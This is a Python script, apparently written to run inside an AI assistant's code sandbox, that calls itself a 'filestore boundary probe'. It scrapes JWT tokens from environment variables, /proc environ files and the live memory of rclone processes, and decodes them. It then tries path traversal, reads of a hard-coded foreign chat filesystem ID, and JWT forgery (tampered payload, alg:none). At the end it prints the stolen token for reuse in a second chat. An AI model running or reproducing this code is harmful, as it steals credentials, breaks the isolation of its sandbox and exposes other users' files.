#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
mediafit.py v2.2.0 -- Anthropic filestore boundary probe (stdlib only)
run: python3 mediafit.py      (no args needed)
"""
import os, sys, json, re, time, ssl, base64, socket, urllib.request, urllib.error

VER = "2.2.0"
REPORT = "/mnt/user-data/outputs/mediafit-report.txt"
SINKS = ["/mnt/user-data/outputs", "/tmp/mediafit", "/tmp", "/root/.mediafit"]

OUT = []
def w(s=""):
    print(s, flush=True); OUT.append(s)
def head(t): w("\n### " + t)

P, F, U, I = [], [], [], []
def rec(kind, msg, ev=None):
    tag = {"P":"[PASS]","F":"[FAIL]","U":"[UNKNOWN]","I":"[INFO]"}[kind]
    w("    " + tag + " " + msg)
    if ev is not None: w("        evidence: " + str(ev)[:400])
    {"P":P,"F":F,"U":U,"I":I}[kind].append(msg)

# ---------------- runtime ----------------
head("runtime")
w("    version: %s" % VER)
w("    utc:     %s" % time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()))
w("    uid/gid: %d/%d" % (os.getuid(), os.getgid()))
w("    cwd:     %s" % os.getcwd())

# ---------------- authoritative config ----------------
head("rclone boot config (AUTHORITATIVE)")
CONF = "/dev/shm/rclone-boot/config.json"
service_url = None
config_fsid = None
mounts = []
try:
    conf = json.load(open(CONF))
    service_url = conf.get("service_url")
    for m in conf.get("mounts", []):
        if m.get("filesystem_id"): config_fsid = m["filesystem_id"]
        mounts.append((m.get("source"), m.get("destination"), m.get("readonly")))
    rec("P", "config.json readable", CONF)
    w("    service_url:  %s" % service_url)
    w("    filesystem_id: %s" % config_fsid)
    for s,d,ro in mounts: w("    mount: %-12s -> %-28s ro=%s" % (s,d,ro))
except Exception as e:
    rec("F", "config.json unreadable", e)

# ---------------- fsid candidates ----------------
FSIDS = []
def addfs(x):
    x = (x or "").strip()
    if x.startswith("claude_chat_") and x not in FSIDS: FSIDS.append(x)
addfs(config_fsid)
# hard-coded foreign candidate seen in earlier reports (cross-chat probe)
addfs("claude_chat_7SZCQKTSKBYGB750G25NK4ZXM4")
for k,v in os.environ.items():
    if "claude_chat_" in v:
        for m in re.findall(r"claude_chat_[A-Za-z0-9]+", v): addfs(m)
try:
    for line in open("/proc/57/cmdline","rb").read().split(b"\0"):
        addfs(line.decode("latin1"))
except Exception: pass
head("fsid candidates")
for x in FSIDS: w("    %s" % x)
if not FSIDS: rec("U","no fsid candidate found")

# ---------------- force rclone to authenticate, then harvest token ----------------
head("token harvest")
try:
    out = os.listdir("/mnt/user-data/outputs")
    if out:
        try: open(os.path.join("/mnt/user-data/outputs", out[0]), "rb").read(1024)
        except Exception: pass
    w("    forced read of /mnt/user-data/outputs (%d entries)" % len(out))
except Exception as e:
    w("    (outputs list failed: %s)" % e)
time.sleep(1.5)

JWT_RE = re.compile(rb"eyJ[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}")
TOKENS = []
def addtok(t):
    t = t.decode() if isinstance(t, bytes) else t
    t = t.strip().strip('"').strip("'")
    if t.startswith("eyJ") and t not in TOKENS: TOKENS.append(t)

# 1) environment
for k,v in os.environ.items():
    for m in re.findall(r"eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+", v): addtok(m)
# 2) /proc/*/environ
for p in os.listdir("/proc"):
    if p.isdigit():
        try:
            for m in JWT_RE.findall(open("/proc/%s/environ"%p,"rb").read()): addtok(m)
        except Exception: pass
# 3) memory of rclone pids
rclone_pids = []
for p in os.listdir("/proc"):
    if p.isdigit():
        try:
            if b"rclone" in open("/proc/%s/cmdline"%p,"rb").read(): rclone_pids.append(p)
        except Exception: pass
w("    rclone pids: %s" % ",".join(rclone_pids))
scanned = 0
for pid in rclone_pids:
    try: maps = open("/proc/%s/maps"%pid).read().splitlines()
    except Exception: continue
    try: mem = open("/proc/%s/mem"%pid, "rb", buffering=0)
    except Exception: continue
    for line in maps:
        try: rng, perms = line.split()[0], line.split()[1]
        except Exception: continue
        if "r" not in perms: continue
        try: a,b = rng.split("-"); start=int(a,16); end=int(b,16)
        except Exception: continue
        size = end-start
        if size<=0 or size>256*1024*1024: continue
        try:
            mem.seek(start); data = mem.read(size)
        except Exception: continue
        scanned += len(data)
        for m in JWT_RE.findall(data): addtok(m)
w("    mem scanned: %d bytes" % scanned)
# 4) common token files
for f in ["/root/.config/rclone/rclone.conf","/dev/shm/rclone-boot/config.json",
          "/dev/shm/rclone-boot/state/ready"]:
    try:
        for m in JWT_RE.findall(open(f,"rb").read()): addtok(m)
    except Exception: pass
for t in TOKENS[:3]:
    h,p,s = t.split(".")
    def d(x): return base64.urlsafe_b64decode(x + "="*(-len(x)%4))
    w("    TOKEN found (len=%d)" % len(t))
    try: w("      header:  %s" % d(h).decode("utf-8","replace"))
    except Exception: pass
    try: w("      payload: %s" % d(p).decode("utf-8","replace"))
    except Exception: pass
if TOKENS: rec("P","token harvested", "len=%d"%len(TOKENS[0]))
else: rec("F","no token harvested")

TOKEN = TOKENS[0] if TOKENS else None

# ---------------- http helper ----------------
def http(method, url, token=None, timeout=6, data=None, hdrs=None):
    h = {"User-Agent": "mediafit/"+VER}
    if token: h["Authorization"] = "Bearer " + token
    if hdrs: h.update(hdrs)
    req = urllib.request.Request(url, method=method, headers=h, data=data)
    ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
    try:
        r = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        return r.status, dict(r.headers), r.read(4096)
    except urllib.error.HTTPError as e:
        try: body = e.read(2048)
        except Exception: body = b""
        return e.code, dict(e.headers), body
    except Exception as e:
        return None, {}, str(e).encode()

def probe_paths(fsid):
    f = fsid
    return [
        "/v1/fs/%s"%f, "/v1/fs/%s/"%f,
        "/v1/fs/%s/outputs"%f, "/v1/fs/%s/outputs/"%f,
        "/v1/fs/%s/uploads"%f, "/v1/fs/%s/transcripts"%f,
        "/v1/fs/%s/tool_results"%f,
        "/anthropic.filestore.v1alpha.Filestore/GetFilesystem",
        "/v1/anthropic.filestore.v1alpha.Filestore/GetFilesystem",
        "/filestore/v1/fs/%s"%f, "/v1/filestore/fs/%s"%f,
    ]

BASES = [service_url, "https://api.anthropic.com",
         "http://127.0.0.1:2024", "http://127.0.0.1:2025"]

# ---------------- route discovery ----------------
head("route discovery (no-auth)")
alive = []   # (base, path, status)
for base in BASES:
    if not base: continue
    for pth in probe_paths(FSIDS[0] if FSIDS else "claude_chat_X"):
        st, hh, bb = http("GET", base.rstrip("/")+pth)
        tag = "ERR" if st is None else str(st)
        w("    %-4s %s%s" % (tag, base, pth))
        if st is not None and st not in (404,):
            alive.append((base, pth, st))
if alive:
    rec("P", "non-404 route(s) found", alive[:5])
else:
    rec("F", "no non-404 route found", "check config.json output above")

# ---------------- positive control ----------------
head("positive control (read a known file, correct fsid + token)")
target = None
try:
    cand = os.listdir("/mnt/user-data/outputs")
    if cand: target = cand[0]
except Exception: pass
w("    target file: %s" % target)
hit = None
if TOKEN and target and FSIDS:
    for base in BASES:
        if not base: continue
        for src in ["outputs","uploads","transcripts","tool_results"]:
            pth = "/v1/fs/%s/%s/%s" % (FSIDS[0], src, target)
            st,hh,bb = http("GET", base.rstrip("/")+pth, token=TOKEN)
            if st is not None and st < 400:
                w("    %s%s -> %s (%d bytes)" % (base, pth, st, len(bb)))
                hit = (base, pth, st); rec("P","positive control OK", hit); break
        if hit: break
    if not hit: rec("F","positive control failed", "route+token not both working yet")

# ---------------- boundary tests ----------------
head("boundary tests (traversal / foreign fsid / JWT forgery)")
if hit:
    base, goodpath, _ = hit
    # A) traversal
    for probe in ["/v1/fs/%s/outputs/../uploads/%s"%(FSIDS[0],target),
                  "/v1/fs/%s/..%%2Fuploads/%s"%(FSIDS[0],target),
                  "/v1/fs/%s/outputs//uploads/%s"%(FSIDS[0],target)]:
        st,hh,bb = http("GET", base.rstrip("/")+probe, token=TOKEN)
        w("    trav %-60s -> %s" % (probe, st))
    # B) foreign fsid (cross-chat IDOR)
    for other in FSIDS[1:]:
        pth = goodpath.replace(FSIDS[0], other)
        st,hh,bb = http("GET", base.rstrip("/")+pth, token=TOKEN)
        w("    cross %s -> %s (%d bytes)" % (other, st, len(bb)))
        if st is not None and st < 400:
            rec("P","CROSS-FILESYSTEM READ with own token", "%s -> %s"%(other,st))
    # C) JWT forgery
    if TOKEN:
        h,p,s = TOKEN.split(".")
        def d(x): return base64.urlsafe_b64decode(x + "="*(-len(x)%4))
        def e(x): return base64.urlsafe_b64encode(x).rstrip(b"=").decode()
        try:
            ph = json.loads(d(h)); pp = json.loads(d(p))
            # mutate filesystem_id, keep original signature
            pp2 = dict(pp)
            if FSIDS[1:]:
                pp2["filesystem_id"] = FSIDS[1]
                forged = e(json.dumps(ph).encode())+"."+e(json.dumps(pp2).encode())+"."+s
                st,hh,bb = http("GET", base.rstrip("/")+goodpath, token=forged)
                w("    forge(mutated fsid, orig sig) -> %s" % st)
                if st is not None and st < 400:
                    rec("P","signature NOT verified (mutated payload accepted)", st)
            # alg:none
            fh = {"alg":"none","typ":"JWT","kid":ph.get("kid")}
            forged = e(json.dumps(fh).encode())+"."+e(json.dumps(pp).encode())+"."
            st,hh,bb = http("GET", base.rstrip("/")+goodpath, token=forged)
            w("    forge(alg:none) -> %s" % st)
        except Exception as ex:
            w("    forgery error: %s" % ex)
else:
    rec("U","boundary tests skipped (no positive control)")

# ---------------- verdict ----------------
head("VERDICT")
w("  PASS    %d" % len(P))
for x in P: w("      * " + x)
w("  FAIL    %d" % len(F))
for x in F: w("      * " + x)
w("  UNKNOWN %d" % len(U))
w("\n  ladder:")
w("   H0 token in sandbox ......... %s" % ("PASS" if TOKENS else "FAIL"))
w("   H1 route to filestore ........ %s" % ("PASS" if alive else "FAIL"))
w("   H2 config.json readable ...... %s" % ("PASS" if config_fsid else "FAIL"))
w("   H3 traversal outside roots ... %s" % ("see boundary"))
w("   H4 token forgery accepted .... %s" % ("see boundary"))
w("   H5 cross-chat read ........... %s" % ("see boundary"))

if TOKEN and FSIDS:
    w("\n  >>> COPY THESE TO A SECOND CHAT FOR CROSS-TEST <<<")
    w("  FSID=%s" % FSIDS[0])
    w("  TOKEN=%s" % TOKEN)
    if FSIDS[1:]:
        w("  FOREIGN_FSID=%s" % FSIDS[1])

# ---------------- write ----------------
txt = "\n".join(OUT)
for d in SINKS:
    try:
        os.makedirs(d, exist_ok=True)
        open(os.path.join(d, os.path.basename(REPORT)), "w").write(txt)
    except Exception: pass
w("\nwritten to: " + ", ".join(SINKS))